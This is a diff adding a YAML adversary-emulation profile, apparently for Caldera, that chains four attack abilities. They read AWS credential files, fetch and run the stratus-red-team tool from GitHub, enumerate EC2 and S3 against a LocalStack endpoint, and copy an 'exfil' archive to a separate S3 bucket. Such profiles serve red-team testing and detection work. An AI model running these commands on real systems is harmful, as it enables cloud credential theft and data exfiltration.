@@ -1,0 +1,70 @@
+id: 33d5badc-fa34-4b26-8896-da6e7497e6c7
+name: NIST_Cloud_Intruder
+description: ---
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- eee138ba10bd3bfefc93a82574882eb5
+- 7c7e4225ee879f65e7970d211b5ba7b7
+- 980d0b8af8d76503955afcd514157c84
+- ba0deadb-97ac-4a4c-aa81-21912fc90980
+abilities:
+ eee138ba10bd3bfefc93a82574882eb5:
+  name:  Find AWS credentials
+  tactic:  credential-access
+  technique_name:  "Unsecured Credentials: Credentials In Files"
+  technique_id:  T1552.001
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       cat /home/iot-VirtualBox/.aws/credentials 2>/dev/null || echo "No Credentials"; exit 0
+   - sh:
+     platform: linux
+     command: |
+       cat /home/iot-VirtualBox/.aws/credentials 2>/dev/null || echo "No Credentials"; exit 0
+ 7c7e4225ee879f65e7970d211b5ba7b7:
+  name:  AWS - EC2 Enumeration from Cloud Instance
+  tactic:  discovery
+  technique_name:  "Cloud Infrastructure Discovery"
+  technique_id:  T1580
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       if test -f "$PathToAtomicsFolder/T1580/src/stratus"; then : ; else if [ "$(uname)" = "Darwin" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i Darwin_x86_64 | cut -d '"' -f 4); wget -q -O $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1580/src/; elif [ "$(expr substr $(uname) 1 5)" = "Linux" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i linux_x86_64 | cut -d '"' -f 4); wget -q -O $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1580/src/; fi; fi;  ;  export AWS_REGION=us-west-2; cd $PathToAtomicsFolder/T1580/src; echo "Stratus: Start Warmup."; ./stratus warmup aws.discovery.ec2-enumerate-from-instance; echo "Stratus: Start Detonate."; ./stratus detonate aws.discovery.ec2-enumerate-from-instance
+   - sh:
+     platform: linux
+     command: |
+       echo "Simulating AWS EC2 Instance Enumeration..."; cat ~/.aws/credentials; curl -I http://172.16.9.245:4566 || echo "LocalStack reachable"; exit 0
+   - sh:
+     platform: unknown
+     command: |
+       if test -f "$PathToAtomicsFolder/T1580/src/stratus"; then : ; else if [ "$(uname)" = "Darwin" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i Darwin_x86_64 | cut -d '"' -f 4); wget -q -O $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1580/src/; elif [ "$(expr substr $(uname) 1 5)" = "Linux" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i linux_x86_64 | cut -d '"' -f 4); wget -q -O $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1580/src/; fi; fi;  ;  export AWS_REGION=us-west-2; cd $PathToAtomicsFolder/T1580/src; echo "Stratus: Start Warmup."; ./stratus warmup aws.discovery.ec2-enumerate-from-instance; echo "Stratus: Start Detonate."; ./stratus detonate aws.discovery.ec2-enumerate-from-instance
+ 980d0b8af8d76503955afcd514157c84:
+  name:  AWS S3 Enumeration
+  tactic:  discovery
+  technique_name:  "Cloud Storage Object Discovery"
+  technique_id:  T1619
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       PATH=$PATH:/usr/local/bin aws --endpoint-url=http://172.16.9.245:4566 s3 ls s3://#{target.s3.bucket}
+ ba0deadb-97ac-4a4c-aa81-21912fc90980:
+  name:  Transfer Compressed Archive to Separate S3 Bucket via AWS CLI
+  tactic:  exfiltration
+  technique_name:  "Transfer Data to Cloud Account"
+  technique_id:  T1537
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       LocalFile='#{host.dir.compress}';
+       RemoteName="exfil-#{paw}-$(basename $LocalFile)";
+       aws s3 cp s3://#{s3.source.name}/$RemoteName s3://#{s3.destination.name} --acl bucket-owner-full-control;
+   - psh:
+     platform: linux
+     command: |
+       $SourceFile = (Get-Item #{host.dir.compress});
+       $RemoteName = "exfil-#{paw}-$($SourceFile.name)";
+       aws s3 cp s3://#{s3.source.name}/$RemoteName s3://#{s3.destination.name} --acl bucket-owner-full-control;
